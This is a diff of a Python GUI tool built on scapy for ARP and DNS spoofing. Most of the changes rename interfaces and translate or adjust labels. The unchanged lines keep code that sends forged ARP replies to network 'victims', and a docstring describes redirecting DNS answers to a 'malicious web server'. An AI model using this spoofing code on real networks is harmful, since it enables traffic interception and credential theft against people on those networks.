@@ -26,7 +26,7 @@ from PIL import Image, ImageTk
 # ------------------------------------- MAIN ----------------------------------------
 
 routeur_ip=conf.route.route("0.0.0.0")[2] 
-x = sr1(ARP(pdst=routeur_ip), iface="eno1", timeout=2) # change interface !
+x = sr1(ARP(pdst=routeur_ip), iface="enp0s3", timeout=2) ## change iface !
 routeur_mac=x.hwsrc
 
 class dreamteam(tk.Tk):
@@ -36,9 +36,6 @@ class dreamteam(tk.Tk):
         self.switch_frame(mainwindow)
         self.label= Label(self, text="", bg="black")
         self.label.pack()
-        self.btn = Button(self, text='EXIT', command = self.destroy, bg='#FF5599', font='Courier') 
-        self.btn.pack()
-  
  
     def switch_frame(self, frame_class):
         new_frame = frame_class(self)
@@ -163,8 +160,8 @@ class ARP_one(Frame):
 			packet1 = ethernet / arp1
 			sendp(packet, iface=iface)
 			sendp(packet1, iface=iface)
-			self.text_box.insert("end-1c", "[*]SPOOF ARP VICTIM \n")
-			self.text_box.insert("end-1c", "[*]SPOOF ARP ROUTER \n")
+			self.text_box.insert("end-1c", "[*] ARP SPOOF VICTIM \n")
+			self.text_box.insert("end-1c", "[*] ARP SPOOF ROUTER \n")
 			
 			self.spoof=canvas.create_line(320,45,480,45, arrow=tk.LAST, fill="green", width="7")
 			time.sleep(2)
@@ -221,7 +218,7 @@ class ARP_one(Frame):
             
 		Frame.__init__(self, master)
 		self.multiuser = Button(self, text="► Multi user ◄", command=lambda: master.switch_frame(ARP_all),bg='#FF5544')
-		self.label_if = Label(self, text="☠ ARP Spoofer single victime ☠", font = ( "Courier" , 20 ), bg='#f27c2c', pady=30, padx=120)
+		self.label_if = Label(self, text="  ☠ ARP Spoofer one target ☠  ", font = ( "Courier" , 20 ), bg='#f27c2c', pady=30, padx=120)
 		self.label_if.pack()
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
@@ -273,7 +270,7 @@ class ARP_one(Frame):
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.label_att.pack()
-		#ESPACE
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.multiuser.pack()
@@ -303,6 +300,8 @@ class ARP_one(Frame):
 		self.hacker_pc = hacker_pc
 		self.canvas = canvas
 		self.configure(bg="black")
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
         
 class ARP_all(Frame):
 	def __init__(self, master):
@@ -358,7 +357,7 @@ class ARP_all(Frame):
 				gui_victimes.append(received.psrc)
 				
 			# Display all network victims
-			self.text_box.insert("end-1c", "\nEQUIPEMENTS CONNECTÉS AU RÉSEAU\n")
+			self.text_box.insert("end-1c", "\nCONNECTED MACHINES\n")
 			self.text_box.insert("end-1c", "IP" + " "*18+"MAC\n")
 			for x in victimes:
 				self.text_box.insert("end-1c", "{:16}    {}\n".format(x['ip'], x['mac']))
@@ -404,7 +403,7 @@ class ARP_all(Frame):
 				else:
 					arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
 					packet = ethernet / arp
-					sendp(packet, iface="eno1") # change interface ! 
+					sendp(packet, iface="enp0s3") # change iface !
 					self.text_box.insert("end-1c","[*]ARP Spoof to ( {0} )\n".format(x['ip']))
   
 		Frame.__init__(self, master)
@@ -412,7 +411,7 @@ class ARP_all(Frame):
 		self.items = []
 		self.texts = []
 		self.singleuser = Button(self, text="► Single user ◄", command=lambda: master.switch_frame(ARP_one), bg="#f27c2c")
-		self.label_if = Label(self, text="☠ ARP Spoofer all network ☠", font = ( "Courier" , 20 ), bg='#FF5544', pady=30, padx=120)
+		self.label_if = Label(self, text=" ☠ ARP Spoofer all network ☠  ", font = ( "Courier" , 20 ), bg='#FF5544', pady=30, padx=120)
 		self.label_if.pack()
 		
 		# SPACES
@@ -480,6 +479,16 @@ class ARP_all(Frame):
 		self.label.pack()
 
 		self.configure(bg="black")
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
 
 
 class DNS_attk(Frame):
@@ -506,7 +515,7 @@ class DNS_attk(Frame):
             Modifies the DNS Resource Record `packet`
             to map our globally defined `dns_hosts` dictionary.
             I.E, whenever we see a google.com answer, this function replaces 
-            the real IP address (172.217.19.142) with fake IP address (192.168.40.113)
+            the real IP address (172.217.19.142) with fake IP address (your malicious web server ip)
             """
             # GET INPUT DNS NAME AND IP
             x = self.saisie_dnsname.get()
@@ -748,8 +757,6 @@ class about_nc(Frame):
 		self.arrow=self.canvas_b.create_line(355,20,235,20, arrow=tk.LAST, fill="#99aaff", width="7")
 		
 		
-		self.dt = Label(self, text="Thanks for using our tool...", font = ( "Courier" , 11 ), bg='#FF6633')
-		self.dt.pack()
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.dt = Label(self, text="Copyright ( © ) 2021 KL \n This program comes with ABSOLUTELY NO WARRANTY ! \n It is a free software, and you are welcome to redistribute it under certain conditions. ", font = ( "Courier" , 10 ), bg='red')
